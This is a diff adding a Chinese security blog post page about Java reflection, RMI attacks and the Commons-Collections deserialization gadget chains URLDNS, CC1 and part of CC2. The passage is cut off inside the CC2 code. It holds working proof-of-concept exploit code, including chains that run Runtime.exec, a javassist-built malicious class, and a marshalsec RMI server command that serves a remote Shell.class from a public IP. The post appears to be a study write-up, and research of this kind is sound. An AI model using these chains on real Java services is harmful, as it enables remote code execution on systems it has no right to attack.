@@ -1,0 +1,1334 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Java安全 - P1n93r - 博学而精一</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="P1n93r" /><meta name="description" content="Java反射 Java安全中最火的不过反序列化漏洞，而反序列化漏洞离不开反射。通过反射可以为Java附加上动态特性。 Java中获取java.l" /><meta name="keywords" content="Security, Java, Web, Android" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.96.0 with theme even" />
+
+
+<link rel="canonical" href="https://p1n93r.github.io/post/code_audit/java%E5%AE%89%E5%85%A8/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Java安全" />
+<meta property="og:description" content="Java反射 Java安全中最火的不过反序列化漏洞，而反序列化漏洞离不开反射。通过反射可以为Java附加上动态特性。 Java中获取java.l" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://p1n93r.github.io/post/code_audit/java%E5%AE%89%E5%85%A8/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-02-02T17:52:36+08:00" />
+<meta property="article:modified_time" content="2021-02-02T17:52:36+08:00" />
+
+<meta itemprop="name" content="Java安全">
+<meta itemprop="description" content="Java反射 Java安全中最火的不过反序列化漏洞，而反序列化漏洞离不开反射。通过反射可以为Java附加上动态特性。 Java中获取java.l"><meta itemprop="datePublished" content="2021-02-02T17:52:36+08:00" />
+<meta itemprop="dateModified" content="2021-02-02T17:52:36+08:00" />
+<meta itemprop="wordCount" content="9899">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Java安全"/>
+<meta name="twitter:description" content="Java反射 Java安全中最火的不过反序列化漏洞，而反序列化漏洞离不开反射。通过反射可以为Java附加上动态特性。 Java中获取java.l"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">P1n93r</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">P1n93r</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Java安全</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-02-02 </span>
+        <div class="post-category">
+            <a href="/categories/code_audit/"> code_audit </a>
+            </div>
+          <span class="more-meta"> 约 9899 字 </span>
+          <span class="more-meta"> 预计阅读 20 分钟 </span>
+        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#java反射">Java反射</a></li>
+        <li><a href="#rmi">RMI</a></li>
+        <li><a href="#java反序列化gadget分析">Java反序列化Gadget分析</a>
+          <ul>
+            <li><a href="#urldns">URLDNS</a></li>
+            <li><a href="#cc1">CC1</a></li>
+            <li><a href="#cc2">CC2</a></li>
+            <li><a href="#cc3">CC3</a></li>
+            <li><a href="#cc4">CC4</a></li>
+            <li><a href="#cc5">CC5</a></li>
+            <li><a href="#cc6">CC6</a></li>
+            <li><a href="#cc7">CC7</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="java反射">Java反射</h2>
+<p>Java安全中最火的不过反序列化漏洞，而反序列化漏洞离不开反射。通过反射可以为Java附加上动态特性。</p>
+<p>Java中获取java.lang.Class对象的三种方法如下：</p>
+<ul>
+<li>obj.getClass()</li>
+<li>Class.forName(&ldquo;类的全路径&rdquo;)</li>
+<li>Test.class</li>
+</ul>
+<p>对于第二种方式，其方式相当于：</p>
+<pre><code>Class.forName(className);
+// 相当于：
+// 第二个参数为true意味着执行静态初始化块
+Class.forName(className,true,currentLoader);
+</code></pre>
+<p>此外，对于Java类种，初始化块的执行顺序为：<strong>先执行静态初始化块，再执行非静态初始化块，然后才是构造器</strong> 。</p>
+<p>java.lang.Class对象的常用方法如下：</p>
+<ul>
+<li>clazz.newInstance()：调用这个类的无参构造器。不过不是每个类都有无参构造器；</li>
+<li>clazz.getMethod()：获取这个类的某个公有方法，因为函数存在重载，所以需要传入形参才能唯一确定获取的方法；</li>
+<li>method.invoke()：执行方法；对于这个函数的第一个参数，如果method是非静态方法，则第一个参数为类对象；如果method是静态方法，则第一个参数是类；</li>
+</ul>
+<p>一个利用反射执行命令的demo入下所示：</p>
+<pre><code>@Test
+public void test1() throws Exception {
+    Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);
+    clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;mspaint&quot;);
+}
+</code></pre>
+<p>如果一个类没有无参构造器，且没有静态方法，如何通过反射实例化该类对象，一个例子如下所示：</p>
+<p>其中需要注意： <strong>调用newInstance的时候，因为这个函数本身接收的就是一个可变长参数，而我们传给ProcessBuilder构造器的也是一个可变长参数，二者叠加就是一个二维数组。</strong></p>
+<pre><code>@Test
+public void test2() throws Exception{
+    Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);
+    clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{&quot;calc&quot;}}));
+}
+</code></pre>
+<p>如果一个方法是私有的，如何执行，一个例子如下所示：</p>
+<pre><code>@Test
+public void test3() throws Exception{
+    Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);
+    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor();
+    constructor.setAccessible(true);
+    clazz.getMethod(&quot;exec&quot;, String.class).invoke(constructor.newInstance(),&quot;mspaint&quot;);
+}
+</code></pre>
+<h2 id="rmi">RMI</h2>
+<p>RMI全称是 <code>Remote Mehtod Invocaton</code> ，即远程方法调用，目的就是为了让某个java虚拟机上的对象调用另一个java虚拟机中对象上的方法，是Java独有的一种机制。</p>
+<p>RMI主要存在三个组件：</p>
+<ul>
+<li>RMI Register</li>
+<li>RMI Server</li>
+<li>RMI Client</li>
+</ul>
+<p>首先编写一个RMI Server：</p>
+<pre><code>/**
+ * @author : p1n93r
+ * @date : 2021/3/30 15:37
+ * rmi服务端
+ */
+public class RmiServer {
+
+    /**
+     * 继承了Remote类才能进行远程方法调用
+     */
+    public interface IRemoteHelloWorld extends Remote {
+        public String hello() throws RemoteException;
+    }
+
+    /**
+     * 远程对象，需要继承UnicastRemoteObject类
+     */
+    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld{
+        protected RemoteHelloWorld() throws RemoteException {}
+        @Override
+        public String hello() throws RemoteException {
+        	System.out.println(&quot;我是远程RMI服务端....我正在执行hello()方法...&quot;);
+            return &quot;Hello,I'm p1n93r.&quot;;
+        }
+    }
+
+    /**
+     * 开启RMI监听
+     */
+    public void startRmiBinding() throws Exception{
+        RemoteHelloWorld obj = new RemoteHelloWorld();
+        LocateRegistry.createRegistry(1099);
+        Naming.bind(&quot;rmi://127.0.0.1/Hello&quot;,obj);
+    }
+
+    public static void main(String[] args) throws Exception {
+        new RmiServer().startRmiBinding();
+    }
+}
+</code></pre>
+<p>然后编写一个RMI Client调用远程方法测试一下：</p>
+<pre><code>/**
+ * @author : p1n93r
+ * @date : 2021/3/30 15:46
+ * RMI客户端
+ */
+public class RmiClient {
+
+    public static void main(String[] args)  throws Exception {
+        String[] list = Naming.list(&quot;rmi://127.0.0.1&quot;);
+        System.out.println(&quot;RMI服务端所有的对象如下：&quot;);
+        for (String s : list) {
+            System.out.println(s);
+        }
+
+        //测试调用远程方法
+        System.out.println(&quot;=================================分隔符=====================================&quot;);
+        // 调用RemoteHelloWorld和hello()
+        Remote obj = Naming.lookup(&quot;rmi://127.0.0.1/Hello&quot;);
+        Class&lt;? extends Remote&gt; clazz = obj.getClass();
+        Object hello = clazz.getMethod(&quot;hello&quot;).invoke(obj);
+        System.out.println(hello);
+    }
+}
+</code></pre>
+<p>注意： <strong>hello()方法实际上实在RmiServer上执行的，RmiClient只是获取到了方法返回结果</strong> 。</p>
+<p>运行截图如下所示：</p>
+<p><img src="/media/2020-03-30-1.png" alt="rmiserver"></p>
+<p><img src="/media/2020-03-30-2.png" alt="rmiclient"></p>
+<p>RMI的主要组件示意图如下所示：</p>
+<p><img src="/media/2020-03-30-3.png" alt="RMI组件示意图"></p>
+<p>那么如何利用RMI进行攻击呢？</p>
+<p>首先，如果我们可以访问RMI Register，那么我们可以遍历RMI Server上绑定的所有对象，然后探测这些对象的所有方法，如下demo所示：</p>
+<pre><code>@Test
+public void test1() throws Exception{
+    String[] list = Naming.list(&quot;rmi://127.0.0.1&quot;);
+    ArrayList&lt;Object&gt; rmiObjs = new ArrayList&lt;&gt;();
+    for (String s : list) {
+        System.out.println(s);
+        Remote current = Naming.lookup(&quot;rmi:&quot; + s);
+        rmiObjs.add(current);
+    }
+    rmiObjs.forEach(v-&gt;{
+        // TODO:探测远程对象的方法，进行恶意操作
+    });
+}
+</code></pre>
+<p>其次，如果我们可以控制lookup的地址和codebase(java低版本可以随意控制)，那么我们就可以利用RMI执行任意代码了，一个例子如下所示：</p>
+<pre><code>@Test
+public void test2() throws Exception{
+    System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);
+    System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);
+    System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);
+    Context context = new InitialContext();
+    Object object = context.lookup(&quot;rmi://49.234.105.98/Hello&quot;);
+    System.out.println(object);
+}
+</code></pre>
+<p>RMI服务端则利用marshalsec攻击创建，如下所示：</p>
+<pre><code>java -cp marshalsec.jar marshalsec.jndi.RMIRefServer &quot;http://49.234.105.98:8080/#Shell&quot; 1099
+</code></pre>
+<p>Notice: 需要再开一个Http服务传递Shell.class文件</p>
+<p><img src="/media/2020-03-31-1.png" alt="marshalsec服务端"></p>
+<h2 id="java反序列化gadget分析">Java反序列化Gadget分析</h2>
+<h3 id="urldns">URLDNS</h3>
+<p>先给出ysoserial中的利用链：</p>
+<pre><code>/**
+ * @author : p1n93r
+ * @date : 2021/3/31 11:28
+ * URLDNS Gadget分析
+ */
+public class URLDNS {
+
+    public static Object getObject(final String url) throws Exception {
+
+        //Avoid DNS resolution during payload creation
+        //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
+        URLStreamHandler handler = new SilentURLStreamHandler();
+
+        // HashMap that will contain the URL
+        HashMap ht = new HashMap();
+        // URL to use as the Key
+        URL u = new URL(null, url, handler);
+        //URL u = new URL(null, url);
+        //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+        ht.put(u, url);
+
+        // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+        Class&lt;? extends URL&gt; clazz = u.getClass();
+        Field hashCode = clazz.getDeclaredField(&quot;hashCode&quot;);
+        hashCode.setAccessible(true);
+        hashCode.setInt(u,-1);
+
+        return ht;
+    }
+
+    /**
+     * 防止创建payload的时候发送DNS解析请求
+     */
+    static class SilentURLStreamHandler extends URLStreamHandler {
+
+        @Override
+        protected URLConnection openConnection(URL u) throws IOException {
+            return null;
+        }
+</code></pre>
+<p>​
+@Override
+protected synchronized InetAddress getHostAddress(URL u) {
+return null;
+}
+}</p>
+<pre><code>    public static void main(String[] args) throws Exception {
+        Object object = getObject(&quot;http://aa32z3.dnslog.cn&quot;);
+        SerialUtil.runPayload(object);
+    }
+}
+</code></pre>
+<p><code>SerialUtil.runPayload(object)</code> 的代码如下，就是将构造的恶意对象进行序列化和反序列化操作：</p>
+<pre><code>public static void runPayload(Object object) throws Exception{
+    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+    ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
+    objectOutputStream.writeObject(object);
+    objectOutputStream.close();
+    System.out.println(outputStream);
+    new ObjectInputStream(new ByteArrayInputStream(outputStream.toByteArray())).readObject();
+}
+</code></pre>
+<p>一些说明如下：</p>
+<ul>
+<li>利用链中，实例化URL对象时，传入一个自定义的 <code>SilentURLStreamHandler</code> 类对象，目的为了防止未反序列化前，执行了 <code>getHostAddress()</code> 方法。自定义的 <code>SilentURLStreamHandler</code> 重写了 <code>getHostAddress()</code> 方法，始终返回null，也没进行DNS解析请求，所以反序列化之前，不会进行DNS解析。</li>
+<li>测试URLDNS攻击链，需要传入的url必须是域名格式的，否则不解析。因为是域名解析嘛，所以肯定得域名，ip是不支持的。</li>
+<li>URL类中的handler属性，是transient标识的，不进行序列化。反序列化时，从context中获取handler，所以即使URL对象中的handler属性是我们自定义的一个 <code>SilentURLStreamHandler</code> 类对象，反序列化时仍能执行 <code>getHostAddress()</code> 方法。</li>
+</ul>
+<p>调用栈如下所示：</p>
+<p><img src="/media/2020-03-31-2.png" alt="URLDNS调用栈"></p>
+<p>调用栈分析如下：</p>
+<p>java.util.HashMap#readObject入下所示，末尾 <code>putVal(hash(key), key, value, false, false);</code> 调用了 <code>hash(key)</code> ：</p>
+<pre><code>private void readObject(java.io.ObjectInputStream s)
+    throws IOException, ClassNotFoundException {
+    // Read in the threshold (ignored), loadfactor, and any hidden stuff
+    s.defaultReadObject();
+    reinitialize();
+    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))
+        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +
+                                         loadFactor);
+    s.readInt();                // Read and ignore number of buckets
+    int mappings = s.readInt(); // Read number of mappings (size)
+    if (mappings &lt; 0)
+        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +
+                                         mappings);
+    else if (mappings &gt; 0) { // (if zero, use defaults)
+        // Size the table using given load factor only if within
+        // range of 0.25...4.0
+        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
+        float fc = (float)mappings / lf + 1.0f;
+        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?
+                   DEFAULT_INITIAL_CAPACITY :
+                   (fc &gt;= MAXIMUM_CAPACITY) ?
+                   MAXIMUM_CAPACITY :
+                   tableSizeFor((int)fc));
+        float ft = (float)cap * lf;
+        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?
+                     (int)ft : Integer.MAX_VALUE);
+
+        // Check Map.Entry[].class since it's the nearest public type to
+        // what we're actually creating.
+        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
+        @SuppressWarnings({&quot;rawtypes&quot;,&quot;unchecked&quot;})
+        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];
+        table = tab;
+
+        // Read the keys and values, and put the mappings in the HashMap
+        for (int i = 0; i &lt; mappings; i++) {
+            @SuppressWarnings(&quot;unchecked&quot;)
+                K key = (K) s.readObject();
+            @SuppressWarnings(&quot;unchecked&quot;)
+                V value = (V) s.readObject();
+            putVal(hash(key), key, value, false, false);
+        }
+    }
+}
+</code></pre>
+<p>跟进java.util.HashMap#hash，如下所示，调用了 <code>key.hashCode()</code> ：</p>
+<pre><code>static final int hash(Object key) {
+    int h;
+    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+}
+</code></pre>
+<p>而此时的key为java.net.URL类对象，那么继续跟进java.net.URL#hashCode，如下所示，首先判断当前对象的hashCode是否等于-1，如果等于的话，则调用 <code>hander.hashCode(this)</code> ：</p>
+<pre><code>public synchronized int hashCode() {
+    if (hashCode != -1)
+        return hashCode;
+
+    hashCode = handler.hashCode(this);
+    return hashCode;
+}
+</code></pre>
+<p>继续跟进java.net.URLStreamHandler#hashCode，如下所示，可以看到调用了 <code>getHostAddress(u)</code> ：</p>
+<pre><code>protected int hashCode(URL u) {
+    int h = 0;
+
+    // Generate the protocol part.
+    String protocol = u.getProtocol();
+    if (protocol != null)
+        h += protocol.hashCode();
+
+    // Generate the host part.
+    InetAddress addr = getHostAddress(u);
+    if (addr != null) {
+        h += addr.hashCode();
+    } else {
+        String host = u.getHost();
+        if (host != null)
+            h += host.toLowerCase().hashCode();
+    }
+
+    // Generate the file part.
+    String file = u.getFile();
+    if (file != null)
+        h += file.hashCode();
+
+    // Generate the port part.
+    if (u.getPort() == -1)
+        h += getDefaultPort();
+    else
+        h += u.getPort();
+
+    // Generate the ref part.
+    String ref = u.getRef();
+    if (ref != null)
+        h += ref.hashCode();
+
+    return h;
+}
+</code></pre>
+<p>继续跟进java.net.URLStreamHandler#getHostAddress，如下所示，调用了 <code>InetAddress.getByName(host)</code> ，至此整个利用链完毕：</p>
+<pre><code>protected synchronized InetAddress getHostAddress(URL u) {
+    if (u.hostAddress != null)
+        return u.hostAddress;
+
+    String host = u.getHost();
+    if (host == null || host.equals(&quot;&quot;)) {
+        return null;
+    } else {
+        try {
+            u.hostAddress = InetAddress.getByName(host);
+        } catch (UnknownHostException ex) {
+            return null;
+        } catch (SecurityException se) {
+            return null;
+        }
+    }
+    return u.hostAddress;
+}
+</code></pre>
+<h3 id="cc1">CC1</h3>
+<p>研究环境准备：</p>
+<ul>
+<li>JDK Version&lt;=JDK8u66</li>
+<li>commons-collections 3.1</li>
+</ul>
+<p>为了便于理解，先抽出ysoserial中的片段进行分析，首先抽出主要逻辑，如下，LazyMap进行get操作的时候，会触发Transformer操作，即可执行命令：</p>
+<pre><code>@Test
+public void test5(){
+    // 测试一下ChainedTransformer利用
+    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+            new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})
+    });
+    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+    // 测试一下lazyMap
+    Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
+    lazyMap.get(&quot;test&quot;);
+}
+</code></pre>
+<p>但是如何触发LazyMap的get操作呢？ysoserial中是利用代理触发LazyMap#get，即通过代理对象的handler#invoke来调用LazyMap#get。下面是创建代理对象的关键代码：</p>
+<pre><code>// 将LazyMap封装在AnnotationInvocationHandler中，想办法触发AnnotationInvocationHandler#invoke方法，因为invoke方法内调用了lazyMap#get
+Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
+
+// 如何调用AnnotationInvocationHandler#invoke方法呢？可以使用代理，将前面获取的AnnotationInvocationHandler对象作为代理的handler
+// 那么只要调用代理对象的任何方法，都将触发AnnotationInvocationHandler对象的invoke方法
+// 获取一个代理对象，将前面获取的AnnotationInvocationHandler实例作为代理对象的InvocationHandler
+Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
+</code></pre>
+<p>获取了代理对象后，就可以将代理对象封装在AnnocationInvocationHanler对象中，作为整个反序列化的入口：</p>
+<pre><code>// 最后将proxyMap封装在AnnotationInvocationHandler对象中，作为反序列化入口
+InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
+
+// 最后再把真正的Transformer传入chainedTransformer
+Class&lt;? extends ChainedTransformer&gt; chainedTransformerClass = chainedTransformer.getClass();
+Field iTransformers = chainedTransformerClass.getDeclaredField(&quot;iTransformers&quot;);
+iTransformers.setAccessible(true);
+iTransformers.set(chainedTransformer,trueTransformer);
+</code></pre>
+<p>完整的POC如下：</p>
+<pre><code>@Test
+public void test6() throws Throwable {
+    Transformer[] trueTransformer = {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+            new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}),
+            new ConstantTransformer(1)
+    };
+
+    // 使用ChainedTransformer，防止反序列化之前被执行，此时传入的不是真正的利用链。
+    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+            new ConstantTransformer(1)
+    });
+    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+    // 获取lazyMap
+    Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
+
+    // 将LazyMap封装在AnnotationInvocationHandler中，想办法触发AnnotationInvocationHandler#invoke方法，因为invoke方法内调用了lazyMap#get
+    Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+    constructor.setAccessible(true);
+    InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
+
+    // 如何调用AnnotationInvocationHandler#invoke方法呢？可以使用代理，将前面获取的AnnotationInvocationHandler对象作为代理的handler
+    // 那么只要调用代理对象的任何方法，都将触发AnnotationInvocationHandler对象的invoke方法
+    // 获取一个代理对象，将前面获取的AnnotationInvocationHandler实例作为代理对象的InvocationHandler
+    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
+
+    // 最后将proxyMap封装在AnnotationInvocationHandler对象中，作为反序列化入口
+    InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
+
+    // 最后再把真正的Transformer传入chainedTransformer
+    Class&lt;? extends ChainedTransformer&gt; chainedTransformerClass = chainedTransformer.getClass();
+    Field iTransformers = chainedTransformerClass.getDeclaredField(&quot;iTransformers&quot;);
+    iTransformers.setAccessible(true);
+    iTransformers.set(chainedTransformer,trueTransformer);
+    // 序列化和反序化测试
+    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+    objectOutputStream.writeObject(res);
+    new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())).readObject();
+}
+</code></pre>
+<p>这里给出调用栈，如下图所示：</p>
+<p><img src="/media/2020-03-31-3.png" alt="CC1调用栈"></p>
+<p><em><strong>Notice:</strong></em>  Debug时候，发现Map(Proxy).entrySet()始终无法跳到这个断点，最后是在LazyMap#get中直接打上断点才调试到整个利用链的。</p>
+<p>下面给出完整的利用链：</p>
+<pre><code>Gadget chain:
+	ObjectInputStream.readObject()
+		AnnotationInvocationHandler.readObject()
+			Map(Proxy).entrySet()
+				AnnotationInvocationHandler.invoke()
+					LazyMap.get()
+						ChainedTransformer.transform()
+							ConstantTransformer.transform()
+							InvokerTransformer.transform()
+								Method.invoke()
+									Class.getMethod()
+							InvokerTransformer.transform()
+								Method.invoke()
+									Runtime.getRuntime()
+							InvokerTransformer.transform()
+								Method.invoke()
+									Runtime.exec()
+
+Requires:
+	commons-collections
+</code></pre>
+<p>这边再贴一个P神的原创POC，比ysoserial的要简单：</p>
+<pre><code>@Test
+public void test7() throws Exception{
+    // 用P神的链打一下
+    Transformer[] trueTransformer = {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+            new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}),
+    };
+
+    ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformer);
+    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+    hashMap.put(&quot;value&quot;,&quot;test&quot;);
+    Map evalMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+    Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+    constructor.setAccessible(true);
+    InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, evalMap);
+    // 序列化和反序列化测试
+    SerialUtil.runPayload(handler);
+}
+</code></pre>
+<p>调用栈如下：</p>
+<p><img src="/media/2020-03-31-4.png" alt="P神CC1链"></p>
+<p>为啥JDK8u66之后的版本没法打了，查看AnnotationInvocationHandler类代码的变化，分析如下所示：</p>
+<p><img src="/media/2020-04-01-1.png" alt="AnnotationInvocationHandler代码变化"></p>
+<p>可以看到，更新后的代码中，如果使用P神的链，readObject中也不再调用TransformMap#set()方法了，所以P神的链也不能用。</p>
+<h3 id="cc2">CC2</h3>
+<p>先直接给出POC和分析：</p>
+<pre><code>package com.pinger.javasec.ysoserial;
+
+import com.pinger.javasec.util.SerialUtil;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+/**
+ * @author : p1n93r
+ * @date : 2021/4/1 15:38
+ * CC2 Gadget研究
+ * CC2只对Commons-Collections4有效，3中TransformingComparator没实现序列化接口，无法序列化
+ */
+public class CC2 {
+
+    /**
+     * 需要一个空类作为javassist的模板
+     */
+    public static class Placeholder {}
+
+    public static Object getPayload() throws Exception{
+        String abstractTransletClassPath = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+
+        // 使用javassist生成一个恶意的类
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(Placeholder.class));
+        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));
+
+        CtClass placeholder = classPool.get(Placeholder.class.getName());
+        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
+        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
+        placeholder.makeClassInitializer().insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;mspaint\&quot;);&quot;);
+        placeholder.setName(&quot;EvalClass&quot;);
